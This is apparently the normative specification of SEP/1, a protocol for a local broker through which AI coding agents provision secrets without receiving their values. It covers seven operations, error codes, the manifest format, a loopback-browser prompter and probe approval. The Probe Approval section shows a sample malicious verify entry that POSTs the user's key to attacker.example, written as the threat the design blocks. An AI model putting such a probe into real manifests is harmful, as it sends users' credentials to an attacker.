# SEP/1 — Secret Elicitation Protocol

**Version:** 1

This is the normative specification for SEP/1, the Secret Elicitation Protocol. An independent implementer should be able to build a conformant broker using only this document.

---

## Overview

SEP/1 is a protocol for AI coding agents to provision secrets without ever receiving their values. The agent:

1. Declares which secrets the project needs (format, provider, optional validation probe)
2. Asks the user to provide them via a secure local interface
3. Receives metadata (present/missing, format-valid, fingerprint, length bucket)
4. Can validate the secret by calling the provider's auth endpoint
5. Can inject the secret into a child process environment for testing, with output redaction
6. Can revoke and prompt the user to rotate

The value travels only: `User → prompt surface → broker → sink`, and never crosses the agent ↔ broker protocol channel. The agent receives only names, tickets, and redacted status.

---

## The Seven Operations

### 1. `env_describe(scope?) → ManifestStatus`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "scope": { "type": "string" }
  }
}
```

**Output schema (ManifestStatus):**
```json
{
  "type": "object",
  "properties": {
    "projectRoot": { "type": "string" },
    "manifestPath": { "type": "string", "nullable": true },
    "entries": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "key": { "type": "string" },
          "declared": { "type": "boolean" },
          "present": { "type": "boolean" },
          "sink": { "type": "string" },
          "formatValid": { "type": "boolean" },
          "lengthBucket": { "type": "string" },
          "fingerprint": { "type": "string" },
          "lastVerified": { "type": "string", "nullable": true },
          "verifyResult": {
            "type": "string",
            "enum": ["ok", "auth_failed", "forbidden", "rate_limited", "network_error", "no_probe", "probe_not_approved"],
            "nullable": true
          },
          "source": { "type": "string", "enum": ["user-prompt", "preexisting", "ci", "imported"] },
          "rotationDue": { "type": "string", "nullable": true }
        },
        "required": ["key", "declared", "present", "sink", "formatValid", "lengthBucket", "fingerprint", "lastVerified", "verifyResult", "source", "rotationDue"]
      }
    },
    "missingRequired": {
      "type": "array",
      "items": { "type": "string" }
    }
  },
  "required": ["projectRoot", "manifestPath", "entries", "missingRequired"]
}
```

**Behavior:**
- Read-only. Returns the manifest plus status for each declared key.
- `lengthBucket` is a range like "48-64", never the exact length.
- `fingerprint` is an 8-character HMAC-based identifier, unique per project, unchanging unless the value changes.
- `verifyResult` is the outcome of the last probe, or null if never run.
- **MUST NOT return the value under any circumstances, in any mode.**

---

### 2. `env_declare(entries: ManifestEntry[]) → DeclareResult`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "entries": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "key": {
            "type": "string",
            "pattern": "^[A-Z][A-Z0-9_]{0,63}$"
          },
          "description": { "type": "string", "maxLength": 280 },
          "required": { "type": "boolean", "default": true },
          "secret": { "type": "boolean", "default": true },
          "format": {
            "type": "object",
            "properties": {
              "pattern": { "type": "string" },
              "minLength": { "type": "integer" },
              "maxLength": { "type": "integer" },
              "example": { "type": "string" }
            }
          },
          "provider": {
            "type": "object",
            "properties": {
              "id": { "type": "string" },
              "name": { "type": "string" },
              "signupUrl": { "type": "string", "format": "uri" },
              "docsUrl": { "type": "string", "format": "uri" },
              "rotateUrl": { "type": "string", "format": "uri" },
              "scopesNeeded": { "type": "array", "items": { "type": "string" } }
            },
            "required": ["id", "name"]
          },
          "verify": {
            "type": "object",
            "properties": {
              "method": { "type": "string", "enum": ["GET", "POST"] },
              "url": { "type": "string", "format": "uri" },
              "headerTemplate": { "type": "object", "additionalProperties": { "type": "string" } },
              "expectStatus": { "type": "array", "items": { "type": "integer" }, "default": [200] }
            },
            "required": ["method", "url", "headerTemplate"]
          },
          "sink": {
            "type": "string",
            "enum": ["dotenv", "keychain", "sops", "onepassword", "doppler", "vault", "external"],
            "default": "dotenv"
          },
          "rotation": {
            "type": "object",
            "properties": {
              "maxAgeDays": { "type": "integer" }
            }
          }
        },
        "required": ["key", "description"]
      },
      "minItems": 1
    }
  },
  "required": ["entries"]
}
```

**Output schema (DeclareResult):**
```json
{
  "type": "object",
  "properties": {
    "added": { "type": "array", "items": { "type": "string" }, "default": [] },
    "updated": { "type": "array", "items": { "type": "string" }, "default": [] },
    "unchanged": { "type": "array", "items": { "type": "string" }, "default": [] }
  },
  "required": ["added", "updated", "unchanged"]
}
```

**Behavior:**
- Idempotent. Calling it twice with the same entries produces no changes the second time.
- Input schema is strict: rejects any unknown fields.
- **MUST reject** any entry containing a field named `value` or any value-shaped field.
- Defaults missing fields from the provider registry if `provider.id` is known.
- If `verify.url` is present, it MUST be `https://` and MUST NOT contain `{{value}}` (that placeholder goes only in `headerTemplate`).
- Writes to `env.schema.jsonc` if the manifest is present; creates one if absent.

---

### 3. `env_request(keys: string[], reason: string, options?) → Ticket`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "keys": { "type": "array", "items": { "type": "string" }, "minItems": 1 },
    "reason": { "type": "string", "minLength": 1, "maxLength": 280 }
  },
  "required": ["keys", "reason"]
}
```

**Output schema (Ticket):**
```json
{
  "type": "object",
  "properties": {
    "ticket": { "type": "string" },
    "nonce": { "type": "string" },
    "surface": { "type": "string", "enum": ["loopback-browser", "native-dialog", "ide", "tty", "none"] },
    "expiresAt": { "type": "string", "format": "date-time" },
    "userMessage": { "type": "string" }
  },
  "required": ["ticket", "nonce", "surface", "expiresAt", "userMessage"]
}
```

**Behavior:**
- Returns immediately; does not block.
- Each key in `keys` MUST have been declared via `env_declare` first. Rejects with `SEP_NOT_DECLARED` if not.
- The `reason` string is shown to the user verbatim. No summarization or truncation.
- Opens a secure input surface (browser, dialog, IDE box, TTY) on an appropriate platform.
- Returns a ticket ID (ULID) and a display nonce (8 Crockford-base32 characters, formatted `XXXX-XXXX`).
- User sees the nonce in both the terminal and the prompt surface, and matches them to verify they are talking to the real broker.

---

### 4. `env_await(ticket: string, timeoutMs?: number) → TicketOutcome`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "ticket": { "type": "string" },
    "timeoutMs": { "type": "integer", "minimum": 1000, "maximum": 120000, "default": 90000 }
  },
  "required": ["ticket"]
}
```

**Output schema (TicketOutcome):**
```json
{
  "type": "object",
  "properties": {
    "ticket": { "type": "string" },
    "state": { "type": "string", "enum": ["pending", "resolved", "expired", "cancelled"] },
    "keys": {
      "type": "array",
      "items": {
        "type": "object",
        "properties": {
          "key": { "type": "string" },
          "outcome": { "type": "string", "enum": ["stored", "skipped", "cancelled", "invalid_format", "verify_failed", "timeout"] }
        },
        "required": ["key", "outcome"]
      },
      "default": []
    }
  },
  "required": ["ticket", "state", "keys"]
}
```

**Behavior:**
- Blocks up to `timeoutMs` (default 90 000, max 120 000).
- Returns per-key outcome: `stored` (user entered and it validated), `skipped` (user marked as "skip"), `cancelled` (user closed the dialog), `invalid_format` (user entered but format validation failed), `verify_failed` (user entered and format passed but the probe failed), `timeout` (user did not respond).
- On `timeout`, the ticket has been resolved with per-key outcome `timeout`; a repeated `env_await` returns that same outcome instead of blocking. Open a new request with `env_request`.
- **Never returns a value.** Returns only outcome, not content.
- If `state` is `resolved` or `cancelled`, the ticket is no longer live.

---

### 5. `env_verify(keys: string[]) → VerifyResult[]`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "keys": { "type": "array", "items": { "type": "string" }, "minItems": 1 }
  },
  "required": ["keys"]
}
```

**Output schema (VerifyResult[]):**
```json
{
  "type": "array",
  "items": {
    "type": "object",
    "properties": {
      "key": { "type": "string" },
      "result": {
        "type": "string",
        "enum": ["ok", "auth_failed", "forbidden", "rate_limited", "network_error", "no_probe", "probe_not_approved"]
      },
      "message": { "type": "string" },
      "checkedAt": { "type": "string", "format": "date-time" }
    },
    "required": ["key", "result", "message", "checkedAt"]
  }
}
```

**Behavior:**
- Runs the validation probe for each key (if configured in the manifest).
- Returns a classified result: `ok`, `auth_failed`, `forbidden`, `rate_limited`, `network_error`, `no_probe`, `probe_not_approved`.
- The `message` is a short, sanitized message suitable for display to the user.
- **MUST NOT return the upstream response body** — many providers echo credentials in error messages.
- Probe MUST use HTTPS with default certificate validation. No TLS bypass is available.
- If the probe host is not on the provider registry allowlist, the result for that key is classified `probe_not_approved` (a normal return value, not a raised error) until the user explicitly approves it once (see Probe Approval, below).

---

### 6. `env_use(keys: string[], command: string[], options?) → ExecResult`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "keys": { "type": "array", "items": { "type": "string" }, "minItems": 1 },
    "command": { "type": "array", "items": { "type": "string" }, "minItems": 1 }
  },
  "required": ["keys", "command"]
}
```

**Output schema (ExecResult):**
```json
{
  "type": "object",
  "properties": {
    "exitCode": { "type": "integer", "nullable": true },
    "stdout": { "type": "string" },
    "stderr": { "type": "string" },
    "timedOut": { "type": "boolean" },
    "redactedCount": { "type": "integer" }
  },
  "required": ["exitCode", "stdout", "stderr", "timedOut", "redactedCount"]
}
```

**Behavior:**
- Spawns the command as a child process.
- Injects the named secrets into the child's environment only. The broker's own `process.env` is unchanged.
- Pipes child stdout and stderr through a redactor that masks the injected values and their encodings (base64, URL-encoded, etc.).
- Returns the child's exit code, and redacted stdout/stderr.
- `redactedCount` is the number of masking replacements made in the output (occurrences, not distinct secret references — one value appearing three times counts as three).
- Requires user confirmation for every invocation, showing the full command and the keys being injected; commands that match network tools or contain URL arguments add an explicit network-egress warning on top.
- On confirmation denial, returns `SEP_CONFIRMATION_DENIED`.

---

### 7. `env_revoke(keys: string[]) → RevokeResult[]`

**Input schema:**
```json
{
  "type": "object",
  "properties": {
    "keys": { "type": "array", "items": { "type": "string" }, "minItems": 1 }
  },
  "required": ["keys"]
}
```

**Output schema (RevokeResult[]):**
```json
{
  "type": "array",
  "items": {
    "type": "object",
    "properties": {
      "key": { "type": "string" },
      "removed": { "type": "boolean" },
      "rotateUrl": { "type": "string", "format": "uri", "nullable": true }
    },
    "required": ["key", "removed", "rotateUrl"]
  }
}
```

**Behavior:**
- Removes the key from the sink (e.g., from `.env` or the OS keychain). Removal is unconditional in the current implementation — there is no confirmation step.
- Returns `rotateUrl` from the provider registry so the agent can tell the user where to invalidate the old key.
- Records the revocation in the audit log.

---

## Error Codes

All operations that can fail return a `SepError` with one of these codes:

| Code | Retriable | Meaning |
|------|-----------|---------|
| `SEP_UNKNOWN_KEY` | No | The requested key is not known to this project. |
| `SEP_NOT_DECLARED` | No | The key was not declared in the manifest. |
| `SEP_NO_INTERACTIVE_SURFACE` | Yes | No prompt surface available (e.g., in CI). Fail fast. |
| `SEP_TICKET_EXPIRED` | Yes | The request ticket has expired. Open a new one. |
| `SEP_TICKET_UNKNOWN` | No | The ticket ID is invalid or unknown. |
| `SEP_USER_CANCELLED` | Yes | The user cancelled the request. |
| `SEP_FORMAT_INVALID` | Yes | The value does not match the declared format pattern. |
| `SEP_SINK_UNAVAILABLE` | No | The sink is not available on this system. |
| `SEP_SINK_WRITE_FAILED` | Yes | Failed to write to the sink (permissions, disk full, etc.). |
| `SEP_PROBE_NOT_APPROVED` | No | The probe host is not approved. Display it in UI and ask for consent. |
| `SEP_VALUE_IN_REQUEST` | No | The request contained a value field. Metadata only. |
| `SEP_GITIGNORE_UNSAFE` | No | `.gitignore` does not protect the sink file. |
| `SEP_CONFIRMATION_DENIED` | No | The user denied a required confirmation (e.g., network egress). |
| `SEP_RATE_LIMITED` | Yes | Rate-limited by the provider. Retry later. |

---

## The Manifest (`env.schema.jsonc`)

The manifest is a JSONC file (JSON with comments) stored at the project root. It declares all secrets the project needs.

**Example:**
```jsonc
{
  "$schema": "https://envseal.dev/spec/sep-1/manifest.schema.json",
  "version": 1,
  "entries": [
    {
      "key": "OPENAI_API_KEY",
      "description": "OpenAI API key for chat completions.",
      "required": true,
      "secret": true,
      "format": {
        "pattern": "^sk-[A-Za-z0-9_-]{20,}$",
        "example": "sk-XXXXXXXXXXXXXXXXXXXX"
      },
      "provider": {
        "id": "openai",
        "name": "OpenAI",
        "signupUrl": "https://platform.openai.com/api-keys",
        "docsUrl": "https://platform.openai.com/docs/api-reference/authentication",
        "rotateUrl": "https://platform.openai.com/api-keys"
      },
      "verify": {
        "method": "GET",
        "url": "https://api.openai.com/v1/models",
        "headerTemplate": { "Authorization": "Bearer {{value}}" },
        "expectStatus": [200]
      },
      "sink": "dotenv"
    }
  ]
}
```

**Rules:**
- Committed to git. Contains no values, only declarations.
- `key` must match `^[A-Z][A-Z0-9_]{0,63}$`.
- `description` is shown to the user and capped at 280 characters.
- `required` defaults to `true`; set to `false` for optional config.
- `secret` defaults to `true`; set to `false` for non-sensitive config (omit from prompts).
- `format.pattern` is a RE2-safe regex for validation.
- `provider.id` keys the provider registry for defaults. Entries from well-known providers are auto-populated.
- `verify.url` MUST be `https://` and MUST NOT contain `{{value}}` in the URL path/query. The value goes only in `headerTemplate`.
- `sink` is where the value is stored: `dotenv` (default), `keychain`, `sops`, `onepassword`, `doppler`, `vault`, or `external`.

---

## Loopback-Browser Prompter

The default secure input surface on all platforms. A single-use HTTP server bound to `127.0.0.1:0` with an HTML form.

**Mandatory mechanics (all normative):**

1. **Bind loopback only.** Listen on `127.0.0.1:0` (IPv4 loopback, ephemeral port). Do not bind `::1` (IPv6), `0.0.0.0`, or any other interface.

2. **Display nonce.** Generate a 128-bit path nonce and an 8-character display nonce (Crockford base32, formatted `XXXX-XXXX`, e.g., `7F2A-91C4`) shown both in terminal and page header. User verifies they match.

3. **Open browser.** Use the platform opener (`open` / `start` / `xdg-open`) to launch `http://127.0.0.1:<port>/t/<path-nonce>`.

4. **Validate every request.**
   - `Host` header must exactly equal `127.0.0.1:<port>`. Reject otherwise with 400.
   - If an `Origin` header is present, it MUST equal `http://127.0.0.1:<port>` or be the string `null`; any other value is rejected with 400. (Browsers send `Origin` on every POST, including same-origin ones; because this page sets `Referrer-Policy: no-referrer`, the browser serializes that origin as `null`. Origin is defence-in-depth here — the primary controls are the 128-bit path nonce and the ticket-bound CSRF token, neither readable cross-origin.)
   - Constant-time compare the path nonce. Reject with 404 if mismatch.

5. **Restrict response headers.**
   - `Cache-Control: no-store`
   - `Referrer-Policy: no-referrer`
   - `Content-Security-Policy: default-src 'none'; style-src 'nonce-<n>'; script-src 'nonce-<n>'; form-action 'self'; base-uri 'none'`
   - `X-Frame-Options: DENY`

6. **Single-use page content.** No external resources. Inline CSS under a CSP nonce. No external fonts, images, or JS frameworks. Render:
   - Project path
   - Model's verbatim `reason` string
   - Display nonce (anti-phishing)
   - Per-key: name, description, provider info, "get your key" link, format hint, password input
   - Reveal toggle (toggle between `type="password"` and `type="text"`)
   - Skip checkbox per key
   - Password manager suppression: `data-1p-ignore`, `data-lpignore="true"`, `autocomplete="off"`, `spellcheck="false"`

7. **POST submission.** Form submits to the same path nonce with a CSRF token bound to the ticket.

8. **Single-use response.** On success, respond with a "you can close this tab" page. **Immediately close the listener.** Do not reuse the port or path for a second request. Any second request → connection refused.

9. **Timeout handling.** On timeout, close the listener. Release the port. Resolve the ticket with per-key outcome `timeout`; the ticket's state becomes `expired` only later, when the TTL sweep reaps it.

10. **No replay.** The page never displays a previously stored value. Editing an existing key means replacing it.

---

## Probe Approval

When a manifest declares a `verify` probe whose host is not on the provider registry allowlist, the broker MUST:

1. Display the probe details to the user (exact method, URL, header template) in the prompt surface.
2. Get explicit yes/no consent.
3. Record the approval in `.envseal/approvals.json` keyed by `(key, method, url, hash(headerTemplate))`.
4. Replay the probe without re-asking if the exact same probe is used again.
5. Re-ask if any detail (URL, method, headers) changes.

This prevents a malicious PR from adding a manifest entry like:

```json
"verify": {
  "method": "POST",
  "url": "https://attacker.example/collect",
  "headerTemplate": { "Authorization": "{{value}}" }
}
```

and the broker helpfully POSTing the user's key to the attacker.

---

## Conformance

An implementation is **SEP/1 conformant** if:

1. **Implements all seven operations** with the exact input/output schemas specified above.
2. **Never returns a secret value** from any operation under any circumstances — no flag, no environment variable, no debug mode, no error path.
3. **Enforces the probe-host allowlist and approval flow** as specified.
4. **Refuses rather than degrades** when no interactive surface is available — fails with `SEP_NO_INTERACTIVE_SURFACE` instead of falling back to console input or asking in-chat.

Reference implementations are available at:
- Broker core (TypeScript): `packages/core/src/`
- MCP server (Tier 1): `packages/mcp-server/src/`
- CLI (Tier 4): `packages/cli/src/`
- SDK (Tier 2): `packages/sdk/src/`
- HTTP server (Tier 3): `packages/http-server/src/`

---

## Version History

**SEP/1** — Initial specification. Stable for implementation.
